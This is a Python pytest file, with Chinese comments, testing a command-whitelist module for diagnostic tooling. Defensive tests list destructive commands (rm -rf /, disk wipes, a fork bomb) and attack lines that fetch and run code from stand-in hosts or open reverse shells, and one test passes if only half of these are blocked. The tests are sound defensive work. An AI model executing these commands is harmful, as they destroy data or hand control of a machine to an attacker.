"""
命令白名单模块测试
"""

import pytest
from src.core.command_whitelist import (
    CommandWhitelist,
    WhitelistedCommand,
    default_whitelist,
)
from src.utils.exceptions import CommandNotAllowedError, CommandArgumentNotAllowedError


class TestWhitelistedCommand:
    """WhitelistedCommand测试"""

    def test_create_command(self):
        """测试创建命令定义"""
        cmd = WhitelistedCommand(
            command="ping",
            description="测试网络连通性",
            category="network",
            allowed_args=["-c", "-w"],
            risk_level="low",
        )

        assert cmd.command == "ping"
        assert cmd.description == "测试网络连通性"
        assert cmd.category == "network"
        assert cmd.allowed_args == ["-c", "-w"]
        assert cmd.risk_level == "low"


class TestCommandWhitelist:
    """CommandWhitelist测试"""

    def test_default_whitelist_has_common_commands(self):
        """测试默认白名单包含常用命令"""
        whitelist = CommandWhitelist()

        # 检查常见命令
        assert whitelist.get_command("ping") is not None
        assert whitelist.get_command("curl") is not None
        assert whitelist.get_command("netstat") is not None
        assert whitelist.get_command("dig") is not None
        assert whitelist.get_command("systemctl") is not None

    def test_validate_allowed_command(self):
        """测试验证允许的命令"""
        whitelist = CommandWhitelist()

        # ping命令应该被允许
        is_valid, cmd_info = whitelist.validate("ping -c 3 8.8.8.8")
        assert is_valid is True
        assert cmd_info is not None
        assert cmd_info.command == "ping"

    def test_validate_command_with_allowed_args(self):
        """测试带允许参数的命令"""
        whitelist = CommandWhitelist()

        is_valid, _ = whitelist.validate("ping -c 5 -w 10 example.com")
        assert is_valid is True

    def test_validate_disallowed_command(self):
        """测试不允许的命令"""
        whitelist = CommandWhitelist()

        # rm命令不应该在白名单中
        is_valid, cmd_info = whitelist.validate("rm -rf /")
        assert is_valid is False
        assert cmd_info is None

    def test_validate_dangerous_command(self):
        """测试危险命令"""
        whitelist = CommandWhitelist()

        dangerous_commands = [
            "rm -rf /",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown -h now",
            "reboot",
            ":(){ :|:& };:",  # Fork bomb
        ]

        for cmd in dangerous_commands:
            is_valid, _ = whitelist.validate(cmd)
            assert is_valid is False, f"Command should be blocked: {cmd}"

    def test_validate_or_raise_allowed(self):
        """测试validate_or_raise方法允许的命令"""
        whitelist = CommandWhitelist()

        result = whitelist.validate_or_raise("curl -I http://example.com")
        assert result.command == "curl"

    def test_validate_or_raise_disallowed(self):
        """测试validate_or_raise方法不允许的命令"""
        whitelist = CommandWhitelist()

        with pytest.raises(CommandNotAllowedError) as exc_info:
            whitelist.validate_or_raise("rm -rf /")

        assert "rm" in str(exc_info.value)

    def test_get_by_category(self):
        """测试按分类获取命令"""
        whitelist = CommandWhitelist()

        network_commands = whitelist.get_by_category("network")
        assert len(network_commands) > 0

        # 所有返回的命令都应该是network分类
        for cmd in network_commands:
            assert cmd.category == "network"

    def test_get_categories(self):
        """测试获取所有分类"""
        whitelist = CommandWhitelist()

        categories = whitelist.get_categories()
        assert "network" in categories
        assert "dns" in categories
        assert "port" in categories

    def test_add_command(self):
        """测试添加自定义命令"""
        whitelist = CommandWhitelist()

        custom_cmd = WhitelistedCommand(
            command="custom_tool",
            description="Custom diagnostic tool",
            category="custom",
            allowed_args=["-v"],
            risk_level="low",
        )

        whitelist.add_command(custom_cmd)

        assert whitelist.get_command("custom_tool") is not None
        is_valid, _ = whitelist.validate("custom_tool -v")
        assert is_valid is True

    def test_remove_command(self):
        """测试移除命令"""
        whitelist = CommandWhitelist()

        # 添加一个临时命令
        temp_cmd = WhitelistedCommand(
            command="temp_cmd",
            description="Temporary command",
            category="test",
            allowed_args=[],
            risk_level="low",
        )
        whitelist.add_command(temp_cmd)

        # 验证已添加
        assert whitelist.get_command("temp_cmd") is not None

        # 移除
        result = whitelist.remove_command("temp_cmd")
        assert result is True

        # 验证已移除
        assert whitelist.get_command("temp_cmd") is None

    def test_sudo_prefix(self):
        """测试sudo前缀处理"""
        whitelist = CommandWhitelist()

        # 带sudo的命令应该被正确处理
        is_valid, cmd_info = whitelist.validate("sudo iptables -L -n")
        assert is_valid is True
        assert cmd_info.command == "iptables"

    def test_empty_command(self):
        """测试空命令"""
        whitelist = CommandWhitelist()

        is_valid, _ = whitelist.validate("")
        assert is_valid is False

        is_valid, _ = whitelist.validate("   ")
        assert is_valid is False

    def test_default_whitelist_instance(self):
        """测试默认白名单实例"""
        assert default_whitelist is not None
        assert isinstance(default_whitelist, CommandWhitelist)


class TestCommandWhitelistIntegration:
    """命令白名单集成测试"""

    def test_real_diagnostic_commands(self):
        """测试真实诊断命令场景"""
        whitelist = CommandWhitelist()

        # 模拟真实诊断场景中可能使用的命令
        diagnostic_commands = [
            "ping -c 3 google.com",
            "traceroute -n 8.8.8.8",
            "curl -I -m 10 https://example.com",
            "dig @8.8.8.8 google.com",
            "netstat -tulpn",
            "ss -tulpn",
            "systemctl status nginx",
            "df -h",
            "free -h",
            "dmesg -T",
        ]

        for cmd in diagnostic_commands:
            is_valid, _ = whitelist.validate(cmd)
            assert is_valid is True, f"Diagnostic command should be allowed: {cmd}"

    def test_common_attack_commands_blocked(self):
        """测试常见攻击命令被阻止"""
        whitelist = CommandWhitelist()

        attack_commands = [
            "wget http://malicious.com/backdoor.sh -O /tmp/bd.sh",
            "curl http://evil.com/exploit | bash",
            "nc -e /bin/bash attacker.com 4444",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        ]

        blocked_count = 0
        for cmd in attack_commands:
            is_valid, _ = whitelist.validate(cmd)
            if not is_valid:
                blocked_count += 1

        # 大多数攻击命令应该被阻止
        assert blocked_count >= len(attack_commands) // 2
